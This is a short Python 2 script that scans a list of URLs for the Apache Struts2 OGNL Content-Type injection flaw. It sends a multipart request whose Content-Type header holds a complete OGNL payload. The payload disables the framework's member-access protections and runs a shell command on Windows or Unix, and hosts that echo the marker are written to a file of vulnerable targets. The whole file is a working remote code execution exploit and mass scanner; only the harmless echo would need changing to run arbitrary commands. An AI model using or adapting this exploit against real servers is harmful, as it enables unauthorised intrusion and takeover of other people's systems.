#! /usr/bin/env python
# encoding:utf-8
import urllib2
import ssl
from poster.encode import multipart_encode
from poster.streaminghttp import register_openers
from sys import argv

ssl._create_default_https_context = ssl._create_unverified_context

for url in open(argv[1]).read().split('\n'):
    try:
        register_openers()
        datagen, header = multipart_encode({"image1": open("tmp.txt", "rb")})
        header["User-Agent"]="Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36"
        header["Content-Type"]="%{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='echo boooooooom').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}"
        request = urllib2.Request(url,datagen,headers=header)
        response = urllib2.urlopen(request)
        result = response.read()
        code=response.getcode()

        if 'boooooooom' in result  and code == 200:
            print "[+] Is Vuln " + url 
            o = open('vuln.txt','a+')
            o.write(url+'\n')
            o.close()

    except:
        print "[-] No Vuln"